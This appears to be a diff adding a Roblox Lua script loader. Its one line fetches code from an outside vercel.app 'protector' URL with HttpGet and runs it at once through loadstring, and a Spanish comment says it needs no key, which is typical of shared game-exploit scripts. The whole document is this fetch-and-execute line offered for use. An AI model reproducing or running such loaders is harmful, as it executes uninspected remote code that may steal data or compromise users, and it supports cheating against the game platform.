@@ -1,0 +1,3 @@
+
+loadstring(game:HttpGet("https://orrxl4-protector.vercel.app/api/raw?id=uj9w6pb4"))()
+no pide key
